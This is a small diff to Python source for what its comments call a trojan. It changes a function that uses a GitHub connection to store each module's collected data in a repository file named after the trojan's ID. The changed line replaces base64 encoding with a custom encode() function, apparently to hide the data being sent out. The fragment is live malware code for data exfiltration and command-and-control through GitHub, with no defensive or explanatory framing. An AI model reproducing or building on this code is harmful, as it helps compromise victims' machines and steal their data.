@@ -138,7 +138,7 @@ def store_module_result(data,module):#storing module resaults in data section
     gh,repo,branch = connect_to_github()#connect to github
     remote_path = "data/%s/%s_%s.data" % (trojan_id,module,str(time.clock()))
     #store it in a file called like your trojan id in github repository
-    repo.create_file(remote_path,"Commit message",base64.b64encode(data))
+    repo.create_file(remote_path,"Commit message",encode(data))
     #repo action for github create file in repo
     return
 
